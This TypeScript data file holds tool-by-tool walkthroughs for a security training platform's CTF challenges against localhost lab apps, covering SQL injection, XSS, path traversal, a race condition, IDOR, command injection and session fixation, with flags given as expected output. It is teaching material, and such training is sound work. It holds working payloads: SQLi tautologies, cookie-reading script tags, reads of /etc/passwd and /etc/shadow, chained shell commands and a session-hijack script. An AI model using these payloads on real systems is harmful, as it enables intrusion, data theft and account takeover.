// Rich DAST walkthrough content for each challenge, structured by tool.

export interface DastStep {
  description: string;
  command?: string;      // Code block content (curl command, config, etc.)
  expected?: string;     // Expected output / what to look for
  tip?: string;          // Contextual advice
}

export interface DastToolWalkthrough {
  tool: "curl" | "postman" | "burpsuite";
  label: string;
  steps: DastStep[];
}

export type DastWalkthroughMap = Record<string, DastToolWalkthrough[]>;

export const dastWalkthroughs: DastWalkthroughMap = {

  // ── SQL Injection 101 ───────────────────────────────────────────────────
  "sqli-101": [
    {
      tool: "curl",
      label: "curl",
      steps: [
        {
          description: "Send a normal login request to establish a baseline response.",
          command: `curl -X POST http://localhost:8081/login \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d "username=admin&password=wrongpass"`,
          expected: '{"error": "Unauthorized"} with HTTP 401',
        },
        {
          description: "Inject a SQL tautology payload into the username field to bypass authentication.",
          command: `curl -X POST http://localhost:8081/login \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d "username=admin' OR '1'='1&password=anything"`,
          expected: '{"flag": "flag{sql_1nj3ct10n_bypas5_auth_99}"} with HTTP 200',
          tip: "The single quote closes the SQL string literal, and OR '1'='1' makes the WHERE clause always true.",
        },
        {
          description: "Try a comment-based injection to ignore the password check entirely.",
          command: `curl -X POST http://localhost:8081/login \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d "username=admin'--&password="`,
          expected: "Same successful bypass — the -- comments out the AND password= clause.",
          tip: "Different DBMS use different comment syntax: -- (PostgreSQL/MySQL), # (MySQL), /* */ (all).",
        },
        {
          description: "Attempt a UNION-based injection to extract table structure.",
          command: `curl -X POST http://localhost:8081/login \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d "username=' UNION SELECT null,null--&password="`,
          expected: "If the response changes, you've matched the column count. Adjust nulls until it works.",
        },
      ],
    },
    {
      tool: "postman",
      label: "Postman",
      steps: [
        {
          description: "Create a new POST request in Postman targeting the login endpoint.",
          command: `Method: POST
URL: http://localhost:8081/login
Body > x-www-form-urlencoded:
  username: admin
  password: test123`,
          expected: "401 Unauthorized response — confirms the endpoint is reachable.",
        },
        {
          description: "Modify the username value to inject a tautology payload.",
          command: `Body > x-www-form-urlencoded:
  username: admin' OR '1'='1
  password: anything`,
          expected: "200 OK with the flag in the response body.",
          tip: "Postman does not URL-encode form values with single quotes by default — verify by checking the code snippet (</> button).",
        },
        {
          description: "Add a Test Script to automatically validate the flag extraction.",
          command: `// Postman Tests tab:
pm.test("SQLi bypass successful", function() {
    pm.response.to.have.status(200);
    const body = pm.response.json();
    pm.expect(body.flag).to.include("flag{");
});`,
          tip: "Save this as a Postman Collection and use the Runner to iterate through different payloads from a CSV file.",
        },
      ],
    },
    {
      tool: "burpsuite",
      label: "Burp Suite",
      steps: [
        {
          description: "Configure Burp Proxy and intercept the login request.",
          command: `1. Start Burp Suite → Proxy → Intercept is ON
2. Open Burp's browser → navigate to http://localhost:8081
3. Submit a normal login (admin / test123)
4. Observe the intercepted POST request in Proxy tab`,
          tip: "Use Burp's built-in browser to avoid manual proxy configuration.",
        },
        {
          description: "Send the intercepted request to Repeater for manual payload testing.",
          command: `Right-click intercepted request → Send to Repeater (Ctrl+R)

In Repeater, modify the body:
  username=admin' OR '1'='1&password=anything

Click Send → observe 200 response with the flag.`,
          expected: "Response body contains the flag. The injection bypassed the WHERE clause.",
        },
        {
          description: "Use Intruder for automated payload fuzzing on the username field.",
          command: `Right-click request → Send to Intruder (Ctrl+I)

Positions tab:
  username=§admin§&password=test

Payloads tab (Simple list):
  admin' OR '1'='1
  admin'--
  ' OR 1=1--
  ' UNION SELECT null,null--
  admin' AND '1'='2

Attack type: Sniper
Click "Start Attack"`,
          expected: "Sort results by Status Code or Response Length. Payloads returning 200 (instead of 401) confirm injection.",
          tip: "In Burp Professional, use the built-in scanner (Dashboard → New Scan) for automated SQL injection detection.",
        },
      ],
    },
  ],

  // ── XSS Discovery ──────────────────────────────────────────────────────
  "xss-discovery": [
    {
      tool: "curl",
      label: "curl",
      steps: [
        {
          description: "Send a normal search request to see how the parameter is reflected.",
          command: `curl "http://localhost:8082/search?q=hello"`,
          expected: 'Response contains: "You searched: hello" — the input is echoed directly.',
        },
        {
          description: "Inject an HTML tag to test for unescaped rendering.",
          command: `curl "http://localhost:8082/search?q=<b>bold</b>"`,
          expected: "If the response contains raw <b>bold</b> HTML (not encoded), the app is vulnerable.",
          tip: "URL-encode angle brackets if your shell interprets them: %3Cscript%3E",
        },
        {
          description: "Inject a script payload to confirm JavaScript execution context.",
          command: `curl "http://localhost:8082/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E"`,
          expected: "The response embeds <script>alert(document.cookie)</script> — a browser would execute this.",
        },
        {
          description: "Test an event-handler payload as an alternative vector.",
          command: `curl "http://localhost:8082/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E"`,
          expected: "The <img> tag with onerror fires even if the src is invalid.",
          tip: "Different contexts require different payloads: attribute injection, JavaScript string injection, DOM-based sinks.",
        },
      ],
    },
    {
      tool: "postman",
      label: "Postman",
      steps: [
        {
          description: "Create a GET request with the search parameter.",
          command: `Method: GET
URL: http://localhost:8082/search
Params:
  q: <script>alert(1)</script>`,
          expected: "Check the response body — if the script tag appears unencoded in the HTML, XSS is confirmed.",
        },
        {
          description: "Add a test to automatically detect reflection.",
          command: `// Postman Tests tab:
pm.test("XSS payload reflected", function() {
    const body = pm.response.text();
    pm.expect(body).to.include("<script>alert(1)</script>");
});`,
          tip: "Use Postman Collection Runner with a CSV of XSS payloads (e.g. from OWASP XSS Filter Evasion Cheat Sheet) to test multiple vectors.",
        },
        {
          description: "Iterate through context-specific payloads.",
          command: `// CSV payload file (xss_payloads.csv):
payload
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
javascript:alert(1)
<svg onload=alert(1)>

// In Collection Runner, map {{payload}} to the q parameter.`,
        },
      ],
    },
    {
      tool: "burpsuite",
      label: "Burp Suite",
      steps: [
        {
          description: "Browse the search page through Burp Proxy and observe the reflection.",
          command: `1. Intercept OFF → browse to http://localhost:8082/search?q=CANARY123
2. Check Proxy → HTTP History → find the GET /search request
3. In the Response tab, search for "CANARY123"
4. Note it appears directly inside a <p> tag — HTML context injection`,
          tip: "Using a unique canary string (CANARY123) makes it easy to find your input in large responses.",
        },
        {
          description: "Send to Repeater and test script injection.",
          command: `In Repeater, modify the q parameter:

GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1

Click Send → verify the script tag appears unencoded in the response body.`,
          expected: "The response HTML contains the raw <script> tag — confirmed reflected XSS.",
        },
        {
          description: "Use Intruder to fuzz with a comprehensive XSS payload list.",
          command: `Intruder → Positions:
  GET /search?q=§test§ HTTP/1.1

Payloads: Load from file (use Burp's built-in XSS payload list
  or SecLists/Fuzzing/XSS/)

Grep - Match: Add "alert" to flag responses that reflect payloads.
Start Attack → sort by the grep column.`,
          tip: "Burp Professional's scanner will also test for stored XSS by revisiting pages after injection.",
        },
      ],
    },
  ],

  // ── Secure Input (Path Traversal) ──────────────────────────────────────
  "secure-input": [
    {
      tool: "curl",
      label: "curl",
      steps: [
        {
          description: "Fetch a legitimate file to establish the baseline behaviour.",
          command: `curl "http://localhost:8086/view?filename=notes.txt"`,
          expected: "Returns the contents of /var/www/uploads/notes.txt.",
        },
        {
          description: "Attempt a simple traversal to read /etc/passwd.",
          command: `curl "http://localhost:8086/view?filename=../../../etc/passwd"`,
          expected: "Returns the contents of /etc/passwd — root:x:0:0:root:/root:/bin/bash ...",
          tip: "Count the ../ depth needed based on the application's WORKDIR. For /var/www/uploads → 3 levels to reach /.",
        },
        {
          description: "Retrieve the CTF flag file.",
          command: `curl "http://localhost:8086/view?filename=../../../flag.txt"`,
          expected: 'flag{s3cur3_1nput_val1dat10n_succ3ss}',
        },
        {
          description: "Test null-byte truncation (legacy PHP-style bypass).",
          command: `curl "http://localhost:8086/view?filename=../../../etc/passwd%00.txt"`,
          expected: "On older runtimes, the null byte terminates the string before .txt is appended.",
          tip: "Modern Python/Node ignore null bytes, but always test — some middleware may still be vulnerable.",
        },
      ],
    },
    {
      tool: "postman",
      label: "Postman",
      steps: [
        {
          description: "Create a GET request with the filename parameter.",
          command: `Method: GET
URL: http://localhost:8086/view
Params:
  filename: ../../../etc/passwd`,
          expected: "200 OK with passwd file contents.",
        },
        {
          description: "Use Postman's Collection Runner with a traversal wordlist.",
          command: `// traversal_payloads.csv:
path
../../../etc/passwd
../../../etc/shadow
../../../flag.txt
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd

// Map {{path}} to the filename parameter and run.`,
          tip: "The double-dot URL-encoded variants (%2e%2e%2f) test whether the app decodes before or after path validation.",
        },
      ],
    },
    {
      tool: "burpsuite",
      label: "Burp Suite",
      steps: [
        {
          description: "Intercept the file view request and identify the parameter.",
          command: `1. Browse to http://localhost:8086/view?filename=notes.txt
2. In HTTP History, find the GET request
3. Send to Repeater (Ctrl+R)`,
        },
        {
          description: "Fuzz the filename parameter with Intruder.",
          command: `Intruder → Positions:
  GET /view?filename=§notes.txt§ HTTP/1.1

Payloads: Simple list
  ../../../etc/passwd
  ../../../etc/hostname
  ../../../flag.txt
  ....//....//....//etc/passwd

Grep - Extract: Set extraction rules for "root:" (passwd indicator)
Start Attack → sort by response length to find successful reads.`,
          tip: "Different response lengths indicate different files were read. A 0-length response means the path was blocked or doesn't exist.",
        },
        {
          description: "Confirm with Repeater and extract the flag.",
          command: `In Repeater, set filename=../../../flag.txt

Click Send → response body contains the flag.`,
          expected: "flag{s3cur3_1nput_val1dat10n_succ3ss}",
        },
      ],
    },
  ],

  // ── Fintech Race Condition ─────────────────────────────────────────────
  "fintech-bank": [
    {
      tool: "curl",
      label: "curl",
      steps: [
        {
          description: "Check the initial account balance.",
          command: `curl "http://localhost:8087/balance"`,
          expected: '{"balance": 100} — the account starts with $100.',
        },
        {
          description: "Send a single transfer to verify normal behaviour.",
          command: `curl -X POST "http://localhost:8087/transfer?amount=80"`,
          expected: '{"status": "success"} — balance is now $20.',
        },
        {
          description: "Reset the balance and fire three concurrent transfers using xargs.",
          command: `# Reset balance first
curl -X POST "http://localhost:8087/reset"

# Fire 3 concurrent $80 transfers
seq 3 | xargs -P3 -I{} curl -s -X POST \\
  "http://localhost:8087/transfer?amount=80"`,
          expected: "All three return success. Check /balance — it will be -$140 (overdrafted by $240).",
          tip: "The -P3 flag runs 3 curl processes in parallel. The server's 0.4s sleep creates a race window where all three threads read $100 before any deduction occurs.",
        },
        {
          description: "Verify the overdraft and capture the flag.",
          command: `curl "http://localhost:8087/balance"`,
          expected: '{"balance": -140, "flag": "flag{f1nt3ch_rac3_c0nd1t10n_ov3rdr4ft_succ3ss}"}',
        },
      ],
    },
    {
      tool: "postman",
      label: "Postman",
      steps: [
        {
          description: "Create a Collection with Reset, Transfer, and Balance requests.",
          command: `Request 1 — Reset:
  POST http://localhost:8087/reset

Request 2 — Transfer:
  POST http://localhost:8087/transfer?amount=80

Request 3 — Balance:
  GET http://localhost:8087/balance`,
        },
        {
          description: "Use Postman's Collection Runner with iterations to simulate concurrency.",
          command: `Runner settings:
  Collection: Fintech Race
  Iterations: 3
  Delay: 0ms (critical — no delay)

Note: Postman Runner is sequential by default. To truly race,
open 3 browser tabs with Postman and click Send simultaneously,
or use Newman CLI:

  newman run fintech-race.json --iteration-count 3 &
  newman run fintech-race.json --iteration-count 3 &
  newman run fintech-race.json --iteration-count 3 &`,
          tip: "Newman (Postman CLI) allows true parallel execution via shell backgrounding (&).",
        },
        {
          description: "Add a test to detect the overdraft condition.",
          command: `// On the Balance request, Tests tab:
pm.test("Race condition: balance is negative", function() {
    const balance = pm.response.json().balance;
    pm.expect(balance).to.be.below(0);
    console.log("Overdraft achieved: $" + balance);
});`,
        },
      ],
    },
    {
      tool: "burpsuite",
      label: "Burp Suite",
      steps: [
        {
          description: "Capture a transfer request and prepare for parallel replay.",
          command: `1. Browse to http://localhost:8087 → perform a normal transfer
2. In HTTP History, find POST /transfer?amount=80
3. Right-click → Send to Repeater (Ctrl+R)
4. Duplicate the Repeater tab 2 more times (3 total)`,
          tip: "Each Repeater tab holds an independent copy of the request.",
        },
        {
          description: "Reset the balance, then fire all three Repeater tabs simultaneously.",
          command: `1. In one Repeater tab, send POST /reset
2. Rapidly click Send on all 3 transfer tabs within 1 second

Alternatively, use Intruder for precise timing:
  Send to Intruder → Positions: no markers needed (static request)
  Payloads: Null payloads, 3 iterations
  Resource pool: 3 concurrent connections
  Start Attack`,
          expected: "All three return 200 success. The balance endpoint shows a negative value.",
        },
        {
          description: "Verify with Repeater: GET /balance.",
          command: `Create a new Repeater tab:
  GET /balance HTTP/1.1
  Host: localhost:8087

Click Send → observe negative balance and the flag.`,
          expected: '{"balance": -140, "flag": "flag{...}"}',
          tip: "Burp Professional's 'Send group in parallel' feature (2023+) allows you to fire multiple Repeater tabs at exactly the same time.",
        },
      ],
    },
  ],

  // ── IDOR Challenge ─────────────────────────────────────────────────────
  "idor-challenge": [
    {
      tool: "curl",
      label: "curl",
      steps: [
        {
          description: "Request your own profile to observe the response structure.",
          command: `curl "http://localhost:8084/api/v1/profile?id=5" \\
  -H "Authorization: Bearer <your_jwt>"`,
          expected: '{"id": 5, "username": "testuser", "email": "test@example.com"}',
        },
        {
          description: "Enumerate other user IDs by decrementing the id parameter.",
          command: `for i in $(seq 1 10); do
  echo "--- ID: $i ---"
  curl -s "http://localhost:8084/api/v1/profile?id=$i" \\
    -H "Authorization: Bearer <your_jwt>"
  echo
done`,
          expected: "Each ID returns a different user's profile data — no authorization check.",
          tip: "Pay attention to ID=1 — this is typically the admin account.",
        },
        {
          description: "Extract the admin profile containing the flag.",
          command: `curl "http://localhost:8084/api/v1/profile?id=1" \\
  -H "Authorization: Bearer <your_jwt>"`,
          expected: '{"id": 1, "username": "admin", "flag": "flag{idor_access_control_bypass_33}"}',
        },
      ],
    },
    {
      tool: "postman",
      label: "Postman",
      steps: [
        {
          description: "Set up a parameterised request with a variable ID.",
          command: `Method: GET
URL: http://localhost:8084/api/v1/profile?id={{user_id}}
Headers:
  Authorization: Bearer <your_jwt>

// Create an environment variable: user_id = 5`,
        },
        {
          description: "Use Collection Runner with a CSV to enumerate IDs.",
          command: `// idor_ids.csv:
user_id
1
2
3
4
5

Run the collection → inspect each response for different user data.`,
          tip: "Add a test: pm.expect(pm.response.json().id).to.eql(5) — it will FAIL for IDs that return another user's data, proving the IDOR.",
        },
      ],
    },
    {
      tool: "burpsuite",
      label: "Burp Suite",
      steps: [
        {
          description: "Intercept the profile request and send to Intruder.",
          command: `Positions:
  GET /api/v1/profile?id=§5§ HTTP/1.1

Attack type: Sniper
Payloads: Numbers, from 1 to 20, step 1
Start Attack`,
          expected: "All IDs return 200 OK with different user profiles. Sort by response length — the admin profile (ID=1) is often longer.",
          tip: "Add a Grep - Extract rule for 'flag{' to auto-highlight the winning response.",
        },
      ],
    },
  ],

  // ── Command Injection ──────────────────────────────────────────────────
  "cmd-injection": [
    {
      tool: "curl",
      label: "curl",
      steps: [
        {
          description: "Send a normal ping request to verify the endpoint.",
          command: `curl "http://localhost:8085/api/ping?ip=127.0.0.1"`,
          expected: "Normal ping output — PING 127.0.0.1: 56 data bytes ...",
        },
        {
          description: "Chain a second command using a semicolon.",
          command: `curl "http://localhost:8085/api/ping?ip=127.0.0.1;id"`,
          expected: "Ping output followed by: uid=0(root) gid=0(root) — command execution confirmed.",
        },
        {
          description: "Read the flag file using command chaining.",
          command: `curl "http://localhost:8085/api/ping?ip=127.0.0.1;cat%20/flag.txt"`,
          expected: "flag{rce_command_chaining_success_55}",
          tip: "URL-encode spaces as %20. Alternative chaining operators: | (pipe), && (logical AND), || (logical OR), \\n (newline).",
        },
        {
          description: "Test backtick substitution as an alternative vector.",
          command: "curl \"http://localhost:8085/api/ping?ip=`cat /flag.txt`\"",
          expected: "The backtick-enclosed command executes first, and its output is used as the ip argument.",
        },
      ],
    },
    {
      tool: "postman",
      label: "Postman",
      steps: [
        {
          description: "Create a parameterised GET request.",
          command: `Method: GET
URL: http://localhost:8085/api/ping
Params:
  ip: 127.0.0.1;cat /flag.txt`,
          expected: "Response includes flag file contents appended after ping output.",
        },
        {
          description: "Automate testing with multiple injection operators.",
          command: `// cmdi_payloads.csv:
payload
127.0.0.1;id
127.0.0.1|id
127.0.0.1&&id
127.0.0.1||id
127.0.0.1;cat /flag.txt

// Map {{payload}} to the ip parameter in Collection Runner.`,
          tip: "Check which operators succeed — this reveals whether the backend uses sh, bash, or cmd.",
        },
      ],
    },
    {
      tool: "burpsuite",
      label: "Burp Suite",
      steps: [
        {
          description: "Send the ping request to Repeater and test chaining operators.",
          command: `In Repeater:
  GET /api/ping?ip=127.0.0.1;whoami HTTP/1.1

Click Send → check if "root" or a username appears in the response.`,
        },
        {
          description: "Use Intruder to fuzz with a command injection payload list.",
          command: `Positions:
  GET /api/ping?ip=§127.0.0.1§ HTTP/1.1

Payloads: Load from SecLists/Fuzzing/command-injection.txt
Grep - Extract: "root", "uid=", "flag{"

Start Attack → sort by grep match column.`,
          tip: "Blind command injection? Use time-based detection: ip=127.0.0.1;sleep 5 — if the response takes 5+ seconds, injection is confirmed.",
        },
      ],
    },
  ],

  // ── Broken Authentication ──────────────────────────────────────────────
  "broken-auth": [
    {
      tool: "curl",
      label: "curl",
      steps: [
        {
          description: "Obtain a session cookie before authentication.",
          command: `curl -v http://localhost:8083/login 2>&1 | grep "Set-Cookie"`,
          expected: "Set-Cookie: connect.sid=s%3Aabc123... — capture this session ID.",
        },
        {
          description: "Authenticate and check if the session ID changes.",
          command: `curl -v -X POST http://localhost:8083/login \\
  -H "Content-Type: application/json" \\
  -d '{"username":"admin","password":"admin123"}' \\
  -b "connect.sid=s%3Aabc123..." 2>&1 | grep "Set-Cookie"`,
          expected: "If no new Set-Cookie header appears, the session ID was NOT regenerated — session fixation is possible.",
          tip: "Compare the session ID before and after login. If identical, the pre-auth session inherits post-auth privileges.",
        },
        {
          description: "Exploit: fixate a known session on a victim, then reuse it.",
          command: `# Step 1: Attacker gets a session ID
SESSION=$(curl -s -v http://localhost:8083/login 2>&1 | \\
  grep "Set-Cookie" | grep -o 'connect.sid=[^;]*')

# Step 2: Victim logs in with that session (social engineering)
# Step 3: Attacker reuses the same session
curl http://localhost:8083/dashboard -b "$SESSION"`,
          expected: "The dashboard responds as the authenticated victim — session hijacked.",
        },
      ],
    },
    {
      tool: "postman",
      label: "Postman",
      steps: [
        {
          description: "Capture the pre-login session and compare with post-login session.",
          command: `Request 1: GET http://localhost:8083/login
  → Check Cookies tab for connect.sid value

Request 2: POST http://localhost:8083/login
  Body: {"username":"admin","password":"admin123"}
  → Check Cookies tab again

If connect.sid is the same → vulnerability confirmed.`,
          tip: "Use Postman's Console (View → Console) to see raw Set-Cookie headers.",
        },
      ],
    },
    {
      tool: "burpsuite",
      label: "Burp Suite",
      steps: [
        {
          description: "Use Burp's Comparer to diff pre-auth and post-auth sessions.",
          command: `1. Browse to /login → note session ID in HTTP History
2. Submit login credentials
3. Right-click pre-auth response → Send to Comparer
4. Right-click post-auth response → Send to Comparer
5. In Comparer, click "Words" or "Bytes" to diff

If the session cookie is identical in both → session fixation.`,
          tip: "Burp highlights differences in green/red. No difference in Set-Cookie = vulnerable.",
        },
      ],
    },
  ],
};
